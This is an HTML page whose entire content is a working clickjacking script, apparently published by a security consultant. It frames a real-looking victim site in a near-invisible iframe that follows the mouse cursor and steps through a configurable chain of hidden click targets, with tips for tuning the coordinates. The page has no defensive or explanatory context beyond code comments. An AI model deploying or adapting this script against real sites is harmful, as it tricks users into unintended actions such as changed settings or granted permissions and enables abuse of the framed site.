<html>
<body>
<script>
// details: https://security-consulting.icu/blog/2019/03/advanced-clickjacking-script/
// Creator: Foobar7 (Tim Coen)
// License: Free as in beer and free as in speech. Improvements and attribution on use/redistribution welcome.
    
/*
get approximate values:
    use Firefox ruler to find mouse position. 
    enable: Dev Tools (F12) -> ... -> Settings -> Measure a portion of the page
    use: Dev Tools (F12) -> ruler icon -> move mouse
get exact values: adjust tracking div to create click (browser console):
    trackerDiv.setFramePosition(xPos, yPos);
    trackerDiv.setHeight(elementHeight);
    trackerDiv.setWidth(elementWidth);
*/
/***************
* config start *
****************/
victimURL = "http://srmcem.ac.in";
var clickChain = [
    createClick(100,100,50,50), // x/y position + width/height of the target element
    createClick(450,170,150,150), 
];
debug = true;
/*************
* config end *
**************/
// settings
opacity = 0.0000000001; // Chrome ignores clicks on opacity 0.
clickDelay = 1000; // delay in-between which clicks are not registered. Too low results in missed clicks
// debug settings
border = "";
if (debug) {
    opacity = 100;
    border = "border: solid 2px #555;"
}
// basic setup with victim iframe inside div. 
// iframe is cropped so that the target is in the upper-left corner. 
// div will be tracked under mouse cursor.
var trackerDiv = {
    positionX: 0,
    positionY: 0,
    width    : 0,
    height   : 0,
    setPosition : function(x, y) {
        this.set(x, y, this.width, this.height);
    },
    setHeight : function(height) {
        this.set(this.positionX, this.positionY, this.width, height);
    },
    setWidth : function(width) {
        this.set(this.positionX, this.positionY, width, this.height);
    },
    // moves the tracker div to x/y coordinates and sets it's width and height. The center of the div will be under the mouse cursor
    set : function(x, y, width, height) {
        this.width = width;
        this.height = height;
        this.positionX = x;
        this.positionY = y;
        var trackerDiv = document.getElementById("trackerDiv");        
        trackerDiv.style = border + "overflow: hidden; margin: 15px auto; max-width: " + width + "px;max-height: " + height + "px;position:absolute;top:" + (y - (height / 2) - 15) + ";left:" + (x - (width / 2));
    },
    init : function(victimURL) {
        var trackerDiv = document.createElement("div");
        trackerDiv.id = "trackerDiv";
        var victimFrame = document.createElement("iframe");
        victimFrame.scrolling = "no";
        victimFrame.src = victimURL;
        victimFrame.id = "victimFrame";
        trackerDiv.append(victimFrame);
        document.body.append(trackerDiv);
    },
    // changes the position of the frame inside the div. given x/y coordinates will be in the upper-left corner.
    setFramePosition : function(offsetX, offsetY) {
        var victimFrame = document.getElementById("victimFrame");
        victimFrame.style = "opacity: " + opacity + ";border: 0px none; margin-left: -" + offsetX + "px; height: 1500px; margin-top: -" + offsetY + "px; width: 1500px;";
    },
};
// moves the framing div along with the mouse cursor
function moveDiv(e) {
    var cursorPosition = getPosition(e);
    trackerDiv.setPosition(cursorPosition.x, cursorPosition.y);
}
window.onmousemove = moveDiv;
trackerDiv.init(victimURL);
var clickChainPosition = 0;
function createClick(xPos, yPos, elementWidth, elementHeight) {
    return function() {
        trackerDiv.setFramePosition(xPos, yPos);
        trackerDiv.setHeight(elementHeight);
        trackerDiv.setWidth(elementWidth);
    }
}
// iterate over click chain
clickChain[clickChainPosition]();
clickChainPosition++;
var monitor = setInterval(function(){
    var elem = document.activeElement;
    if(elem && elem.tagName == 'IFRAME'){ // user clicked (or iframe stole focus, which messes up the clickchain)
        if (clickChainPosition < clickChain.length) {
            clickChain[clickChainPosition]();
            clickChainPosition++;
            document.activeElement.blur();
        } else {
            clickChainPosition = 0; // restart clickchain
        }
    }
}, clickDelay);
function getPosition(e) {
    return {x: e.pageX, y: e.pageY};
}
</script>
</div>